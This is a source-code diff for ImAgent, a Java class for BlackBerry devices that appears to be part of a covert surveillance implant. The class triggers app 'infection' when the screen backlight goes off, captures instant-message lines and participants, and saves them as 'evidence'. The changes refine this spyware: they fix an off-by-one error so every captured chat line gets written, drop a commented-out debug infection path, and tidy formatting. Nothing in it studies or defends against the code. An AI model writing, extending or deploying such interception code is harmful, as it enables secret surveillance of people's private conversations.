@@ -30,7 +30,6 @@ import blackberry.utils.WChar;
 
 /**
  * Instant Message.
-
  */
 public final class ImAgent extends Agent implements BacklightObserver,
         ApplicationObserver {
@@ -155,13 +154,6 @@ public final class ImAgent extends Agent implements BacklightObserver,
 
             appInjector.callMenuInContext();
         }
-
-        //#ifdef DEBUG
-        if (!appInjector.isInfected() && !infecting) {
-            //infecting = true;
-            //appInjector.infect();
-        }
-        //#endif
     }
 
     /*
@@ -182,7 +174,6 @@ public final class ImAgent extends Agent implements BacklightObserver,
         return false;
     }
 
-    
     public void onBacklightChange(boolean on) {
         if (!on && !appInjector.isInfected()) {
             //#ifdef DEBUG
@@ -190,7 +181,6 @@ public final class ImAgent extends Agent implements BacklightObserver,
             //#endif
 
             appInjector.infect();
-
         }
     }
 
@@ -204,7 +194,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
             debug.trace("onApplicationChange: foreground");
             //#endif
             isAppForeground = true;
-            if(Backlight.isEnabled()){
+            if (Backlight.isEnabled()) {
                 // se l'utente non e' mai andato  su bbm e' possibile che non si sia mai registrato
                 //enableInfect = true;
             }
@@ -245,14 +235,14 @@ public final class ImAgent extends Agent implements BacklightObserver,
         for (lastEqual = lines.size() - 1; lastEqual >= 0; lastEqual--) {
             if (lines.elementAt(lastEqual).equals(lastLine)) {
                 //#ifdef DEBUGs
-                debug.trace("add found: " + lastEqual);
+                debug.trace("add found equal at line: " + lastEqual);
                 //#endif
                 break;
             }
         }
 
         if (lastEqual <= 0) {
-            lastEqual = 0;
+            lastEqual = -1;
             //#ifdef DEBUG
             debug.info("add: no found, save everything.");
             //#endif
@@ -265,6 +255,9 @@ public final class ImAgent extends Agent implements BacklightObserver,
             //#endif
 
             serialize(partecipants, lastLine);
+            //#ifdef DEBUG
+            debug.trace("write evidence from line: " + lastEqual +1);
+            //#endif
             writeEvidence(partecipants, lines, lastEqual + 1);
 
             //#ifdef DEBUG
@@ -293,7 +286,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
         String users = partecipants;
 
         DateTime datetime = new DateTime();
-                final Vector items = new Vector();
+        final Vector items = new Vector();
 
         for (int i = startFrom; i < lines.size(); i++) {
 
@@ -308,7 +301,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
         }
 
         evidence.atomicWriteOnce(items);
-        
+
     }
 
 }
